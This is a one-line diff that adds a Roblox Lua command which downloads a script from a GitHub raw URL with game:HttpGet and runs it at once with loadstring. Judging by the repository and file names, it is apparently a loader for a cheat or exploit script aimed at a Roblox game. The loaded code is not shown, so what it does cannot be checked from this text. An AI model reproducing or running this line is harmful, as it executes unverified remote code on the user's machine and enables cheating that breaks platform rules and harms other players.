@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dizzyhvh/Forest-Fire/refs/heads/main/forsakenbutmore.lua"))()
